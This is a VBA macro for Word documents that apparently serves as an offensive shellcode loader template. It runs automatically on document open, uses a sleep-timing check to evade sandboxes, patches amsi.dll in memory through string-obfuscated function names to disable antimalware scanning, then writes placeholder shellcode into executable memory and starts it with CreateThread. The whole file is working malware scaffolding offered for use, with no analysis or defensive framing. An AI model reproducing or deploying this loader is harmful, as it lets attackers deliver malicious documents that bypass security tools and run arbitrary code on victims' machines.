Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Private Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
Private Declare PtrSafe Function LL Lib "KERNEL32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GPA Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VP Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function CT Lib "KERNEL32" Alias "CreateThread" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VA Lib "KERNEL32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RMM Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    If check() Then
        patch
    End If

    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    #If Win64 Then
        <SHELLCODE64>
    #Else
        <SHELLCODE86>

    #End If

    addr = VA(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RMM(addr + counter, data, 1)
    Next counter
    
    res = CT(0, 0, addr, 0, 0, 0)
End Function

Function check() As Boolean
    Dim strFile As String
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr
    Dim numMods As Integer
    Dim res As LongPtr
    check = False
    
    strFile = Dir("c:\windows\system32\a?s?.d*")
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    #If Win64 Then
        numMods = cbNeeded / 8
    #Else
        numMods = cbNeeded / 4
    #End If
    
    For i = 0 To numMods
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = strFile Then
            check = True
        End If
        Next i
End Function

Function patch()
    Dim dllName As String
    Dim funcName As String
    Dim dll As LongPtr
    Dim addr As LongPtr
    Dim result As Long
    Dim ArrayPointer As LongPtr


    #If Win64 Then
        off = 352
        Dim MyByteArray(6) As Byte
        MyByteArray(0) = 184 ' 0xB8
        MyByteArray(1) = 87  ' 0x57
        MyByteArray(2) = 0   ' 0x00
        MyByteArray(3) = 7   ' 0x07
        MyByteArray(4) = 128 ' 0x80
        MyByteArray(5) = 195 ' 0xC3
    #Else
        off = 256
        Dim MyByteArray(8) As Byte
        MyByteArray(0) = 184 ' 0xB8
        MyByteArray(1) = 87  ' 0x57
        MyByteArray(2) = 0   ' 0x00
        MyByteArray(3) = 7   ' 0x07
        MyByteArray(4) = 128 ' 0x80
        MyByteArray(5) = 194 ' 0xC2
        MyByteArray(6) = 24  ' 0x18
        MyByteArray(7) = 0 ' 0x00
    #End If
    
    dllName = "ams" + "i.dll"
    dll = LL(dllName)
    addr = GPA(dll, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    
    #If Win64 Then
        result = VP(ByVal addr, 6, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        RMM ByVal addr, ByVal ArrayPointer, 6
    #Else
        result = VP(ByVal addr, 8, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        RMM ByVal addr, ByVal ArrayPointer, 8
    #End If
End Function


Sub test()
    MyMacro
End Sub

Sub Document_Open()
    test
End Sub

Sub AutoOpen()
    test
End Sub



